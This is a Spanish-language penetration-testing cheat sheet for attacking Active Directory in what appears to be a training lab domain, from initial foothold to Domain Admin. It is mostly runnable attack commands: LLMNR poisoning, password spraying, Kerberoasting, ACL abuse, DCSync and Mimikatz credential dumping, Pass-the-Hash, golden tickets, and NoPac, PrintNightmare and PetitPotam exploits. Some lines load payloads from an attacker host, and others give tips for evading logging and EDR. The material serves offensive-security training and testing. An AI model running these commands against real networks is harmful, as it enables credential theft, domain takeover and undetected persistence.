---
title: "AD Enumeration & Attacks"
description: "BloodHound, Kerberos, ACL abuse y trust attacks en Active Directory."
sidebar:
  order: 1
  label: "AD Enumeration & Attacks"
---
> Enumeración y ataques contra entornos AD: desde el foothold hasta Domain Admin. Cubre LLMNR poisoning, password spraying, Kerberoasting, ASREPRoasting, ACL abuse, DCSync, Pass-the-Hash y CVEs recientes.

---


## Enumeración inicial (sin creds)

```bash
# Descubrir hosts vivos en la red interna
fping -asgq 172.16.5.0/23

# Nmap — descubrir DC y servicios
sudo nmap -v -A 172.16.5.5 --open

# Responder en modo análisis (pasivo — no envenena)
sudo responder -I ens224 -A

# Enumerar usuarios válidos con Kerbrute (sin creds)
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

---

## LLMNR / NBT-NS Poisoning

### Desde Linux — Responder

```bash
# Envenenar y capturar NetNTLMv2
sudo responder -I ens224 -w -r -f -P

# Crackear el hash capturado
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt
# Formato: usuario::DOMINIO:challenge:hash1:hash2
```

### Desde Windows — Inveigh

```powershell
# PowerShell (Inveigh.ps1)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -LLMNR Y -ConsoleOutput Y -FileOutput Y

# C# (InveighZero — ejecutable)
.\Inveigh.exe

# Ver resultados capturados
Get-Inveigh.NTLMv2Unique
Get-Inveigh.Cleartext
```

---

## Enumeración de política de contraseñas

```bash
# Sin creds (Linux)
crackmapexec smb 172.16.5.5 --pass-pol
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA output

# Con creds
rpcclient -U "" -N 172.16.5.5 -c "getdompwinfo"
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Con creds — Windows (net.exe LOL)
net accounts /domain
```

> **Regla:** Comprobar lockout threshold ANTES de hacer password spraying. Nunca superar n-1 intentos.

---

## Password Spraying

```bash
# Desde Linux — Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Desde Linux — CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Validar credenciales encontradas
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

# Desde Windows — DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## Enumeración con credenciales (Linux)

```bash
# Listar shares con smbmap
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R "Department Shares"

# Descargar archivo desde share
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 --download "path/to/file"

# rpcclient — enumerar usuarios y grupos
rpcclient -U "INLANEFREIGHT\forend%Klmcargo2" 172.16.5.5
rpcclient $> enumdomusers
rpcclient $> queryuser 0x457        # info de usuario por RID

# Ejecución remota
impacket-psexec inlanefreight.local/forend:Klmcargo2@172.16.5.5
impacket-wmiexec inlanefreight.local/forend:Klmcargo2@172.16.5.5

# windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

# CrackMapExec — enumerar usuarios, grupos
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# BloodHound.py — colectar todo desde Linux
bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
# → genera JSON files → zip → subir a BloodHound GUI
```

---

## Enumeración con credenciales (Windows)

### ActiveDirectory PS Module

```powershell
# Info básica del dominio
Get-ADDomain

# Usuarios con SPN (Kerberoastable)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Trusts del dominio
Get-ADTrust -Filter *

# Grupos
Get-ADGroup -Filter * | select name
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView

```powershell
Import-Module .\PowerView.ps1

# Mapear trusts
Get-DomainTrustMapping

# Buscar usuarios con SPN
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Buscar usuarios sin pre-auth Kerberos (ASREPRoastable)
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol

# Miembros de Domain Admins (recursivo)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Verificar admin local en host
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Buscar ACLs interesantes
Find-InterestingDomainAcl -ResolveGUIDs
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

### SharpHound (Windows)

```powershell
# Recolectar todo (genera ZIP para importar en BloodHound)
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### LOL Binaries (sin herramientas externas)

```powershell
# Hosts, rutas, sesiones activas
hostname; [System.Environment]::OSVersion.Version
ipconfig /all; route print; arp -a
qwinsta                          # usuarios conectados actualmente
netsh advfirewall show allprofiles
sc query windefend               # estado de Defender

# net.exe
net accounts /domain             # política de contraseñas
net group "Domain Admins" /domain
net user /domain <usuario>
net1 group /domain               # alternativa si net está monitorizado

# dsquery (admin context)
dsquery user
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName  # DCs

# Snaffler — hunting de credenciales en shares
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

# PowerShell history
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Bajar a PSv2 para evadir logging (EventID 4104)
powershell.exe -version 2
```

---

## Kerberoasting

### Desde Linux

```bash
# Listar cuentas con SPN
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Solicitar TODOS los TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Solicitar ticket de usuario específico y guardar
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Crackear
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
# RC4 → tipo 23 ($krb5tgs$23$) → hashcat -m 13100
# AES → tipo 18 ($krb5tgs$18$) → hashcat -m 19700 (mucho más lento)
```

### Desde Windows — Rubeus

```powershell
# Estadísticas de cuentas Kerberoastables
.\Rubeus.exe kerberoast /stats

# Roast accounts con admincount=1 (alto valor)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Roast cuenta específica
.\Rubeus.exe kerberoast /user:sqldev /nowrap

# Forzar RC4 en cuentas con AES (downgrade)
.\Rubeus.exe kerberoast /rc4opsec /nowrap
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

### Desde Windows — PowerView + Mimikatz

```powershell
# PowerView → exportar tickets en formato Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# Mimikatz → extraer tickets de memoria
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
# Luego en Linux:
# echo "<base64>" | tr -d \\n | base64 -d > ticket.kirbi
# python2.7 kirbi2john.py ticket.kirbi → hashcat -m 13100
```

---

## ASREPRoasting

```bash
# Desde Linux (no requiere creds si se conocen usernames)
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt

# Con creds — lista automática
GetNPUsers.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -format hashcat -outputfile asrep_hashes.txt

# Crackear
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

```powershell
# Desde Windows — Rubeus
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Enumerar primero con PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol
```

---

## ACL Abuse

```powershell
# Enumerar ACEs sobre objeto específico
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# ForceChangePassword — cambiar contraseña sin conocerla
$cred = ConvertTo-SecureString 'Klmcargo2' -AsPlainText -Force
$pass = ConvertTo-SecureString 'NewPassword1!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $pass -Credential $cred

# GenericAll / GenericWrite sobre grupo — añadir usuario
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members damundsen -Credential $cred
Get-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName

# WriteDACL — dar a usuario el derecho DCSync
$SecPassword = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\adunn', $SecPassword)
Add-DomainObjectACL -TargetIdentity INLANEFREIGHT.LOCAL -PrincipalIdentity adunn -Rights DCSync

# GenericWrite sobre usuario — asignar SPN para Kerberoasting dirigido
Set-DomainObject -Credential $Cred -Identity <target_user> -Set @{serviceprincipalname="fake/NOTHING"}
# → Kerberoast ese usuario → crackear → Remove-DomainObject SPN
```

---

## DCSync

```bash
# Desde Linux — secretsdump
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
secretsdump.py -just-dc-user INLANEFREIGHT/administrator INLANEFREIGHT/adunn@172.16.5.5

# Flags útiles:
# -just-dc → solo NTLM hashes y Kerberos keys del NTDS
# -just-dc-ntlm → solo NTLM hashes
# -just-dc-user <usr> → hash de usuario específico
# -pwd-last-set → mostrar fecha de último cambio de contraseña
# -history → incluir historial de contraseñas
# -show-machine-accs → incluir cuentas de máquina
```

```powershell
# Desde Windows — Mimikatz
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\krbtgt   # hash krbtgt para Golden Ticket

# Requisito: cuenta con privilegios DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
# → Típicamente: Domain Admins, Enterprise Admins, o DACL WriteDACL abusada
```

---

## Pass-the-Hash / Pass-the-Ticket

```bash
# Pass-the-Hash — Linux (con NTLM hash)
crackmapexec smb 172.16.5.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c
impacket-psexec administrator@172.16.5.5 -hashes :13b29964cc2480b4ef454c59562e675c
evil-winrm -i 172.16.5.5 -u administrator -H 13b29964cc2480b4ef454c59562e675c
```

```powershell
# Pass-the-Hash — Windows — Mimikatz
mimikatz # sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.local /run:cmd.exe

# Dumping credenciales de memoria
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords       # cleartext + hashes en memoria
mimikatz # sekurlsa::wdigest              # cleartext si WDigest activo
```

---

## Vulnerabilidades recientes (Bleeding Edge)

### NoPac — CVE-2021-42278 + CVE-2021-42287

```bash
# Verificar si el DC es vulnerable
sudo python3 scanner.py inlanefreight.local\forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Shell como SYSTEM en el DC
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 \
  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# DCSync via NoPac (sin shell)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 \
  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### PrintNightmare — CVE-2021-1675 / CVE-2021-34527

```bash
# Verificar spooler activo
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Exploit — añadir usuario local con PrivEsc
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\<ATTACK_IP>\share\MyMalDLL.dll'

# PowerShell PoC desde Windows
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

### PetitPotam + ADCS — CVE-2021-36942

```bash
# 1. Levantar ntlmrelayx apuntando al ADCS
sudo ntlmrelayx.py -debug -smb2support --target http://<ADCS_HOST>/certsrv/certfnsh.asp \
  --adcs --template DomainController

# 2. Coerción via PetitPotam
python3 PetitPotam.py <ATTACK_IP> <DC_IP>

# 3. Solicitar TGT con certificado obtenido
python3 gettgtpkinit.py -pfx-base64 <cert_b64> INLANEFREIGHT.LOCAL/DC01$ dc01_tgt.ccache

# 4. Extraer NT hash del DC
export KRB5CCNAME=dc01_tgt.ccache
python3 getnthash.py -key <key> INLANEFREIGHT.LOCAL/DC01$

# 5. DCSync con hash de cuenta de máquina del DC
secretsdump.py -just-dc-user administrator -hashes :<DC_NT_HASH> INLANEFREIGHT.LOCAL/DC01$@172.16.5.5
```

---

## Trust Attacks — Child → Parent Domain

```bash
# Opción 1: automatizado
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

# Opción 2: manual con Mimikatz (ExtraSids — Golden Ticket con SID History)
# a) Obtener hash KRBTGT del dominio hijo
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# b) Obtener SID del dominio hijo y SID del grupo Enterprise Admins del padre
Get-ADDomain -Identity LOGISTICS.INLANEFREIGHT.LOCAL   # → SID hijo
Get-ADGroup -Identity "Enterprise Admins" -Server INLANEFREIGHT.LOCAL  # → SID EA

# c) Generar Golden Ticket inter-dominio
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
  /sid:<CHILD_DOMAIN_SID> /krbtgt:<CHILD_KRBTGT_HASH> \
  /sids:<ENTERPRISE_ADMINS_SID> /ptt

# d) DCSync en el dominio raíz
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

---

## GPP Credentials (SYSVOL)

```bash
# Buscar cpassword en SYSVOL
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password

# Descifrar manualmente
gpp-decrypt "<cpassword_value>"

# Buscar en shares montados
findstr /S /I cpassword \\<DC>\sysvol\<domain>\policies\*.xml
```

---

## Flujo de ataque AD — End-to-End

```
[Sin creds]
  → fping + nmap → Responder LLMNR → hashcat 5600 → credenciales usuario
  → kerbrute userenum → lista válida → password spray

[Con usuario]
  → BloodHound.py + SharpHound → análisis de rutas de ataque
  → Kerberoast → hashcat 13100 → contraseñas de service accounts
  → ASREPRoast → hashcat 18200 → contraseñas de cuentas DONT_REQ_PREAUTH
  → ACL abuse → ForceChangePassword / GenericAll → escalada

[Con privilegios]
  → DCSync (secretsdump / mimikatz lsadump::dcsync) → NTLM hash de admin/krbtgt
  → Pass-the-Hash → acceso DA / lateral movement
  → Golden Ticket (krbtgt hash) → persistencia
  → Trust attack (raiseChild / ExtraSids) → dominio padre

[Limpiar rastros]
  → Eliminar SPN asignado si se hizo targeted Kerberoast
  → Revertir cambios de ACL (Remove-DomainObjectACL)
  → Eliminar usuarios/grupos creados durante el ataque
```

---

## Pitfalls / Gotchas

- **Password spray sin verificar lockout** → bloquear cuentas y alertar al SOC. Siempre verificar umbral con CrackMapExec `--pass-pol` antes.
- **Kerberoasting en AES (tipo 18)** → tarda 4-5x más que RC4 (tipo 23). Usar `/tgtdeleg` en Rubeus para forzar RC4 (no funciona en Server 2019 DC).
- **DCSync requiere privilegios específicos** → DS-Replication-Get-Changes + DS-Replication-Get-Changes-All. Sin ambos, falla silenciosamente.
- **NoPac detectado fácilmente** → genera eventos 4741+4742 (creación/modificación de computer object). Usar en entornos sin EDR activo.
- **PrintNightmare** → requiere Print Spooler activo en el DC. Verificar con `rpcdump.py | grep MS-RPRN`.
- **BloodHound sin actualizar DB** → si neo4j está corriendo pero la GUI está vacía, importar el ZIP de SharpHound manualmente.
- **PetitPotam bloqueado** → muchos entornos modernos ya tienen el parche. Verificar con `rpcdump.py | grep MS-EFSR`.
- **PowerView `Find-InterestingDomainAcl`** → extremadamente lento en dominios grandes. Usar `Get-DomainObjectACL` con SID específico.
- **SharpHound en Win 2022 DC** → puede requerir `/ldaps` si LDAP sin TLS está deshabilitado.
- **Contraseñas GPP** → el parche de MS14-025 solo impide crear nuevas GPP con cpassword, no elimina las existentes. Siempre buscar en SYSVOL.
- **SID History / ExtraSids** → requiere que el SID Filtering no esté habilitado en el trust. En trusts modernos con SID filtering activo, el ataque no funciona.
- **raiseChild.py automático** → puede fallar si el dominio hijo no tiene configuración de trust estándar. Hacer el proceso manual en ese caso.

---

## Cheatsheets relacionados

- [Password Attacks](/metodologias/exploitation/password-attacks/) — hashcat modes, cracking workflows, NTDS dump
- [Using the Metasploit Framework](/metodologias/exploitation/metasploit-framework/) — módulos AD, psexec, hashdump
- [Pivoting, Tunneling, and Port Forwarding](/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — pivoting hacia DC desde foothold
- [Attacking Enterprise Networks](/metodologias/active-directory/attacking-enterprise-networks/) — flujo end-to-end con AD como objetivo final
- [Windows Privilege Escalation](/metodologias/privesc/windows-privilege-escalation/) — PrivEsc local antes de moverse lateralmente en AD
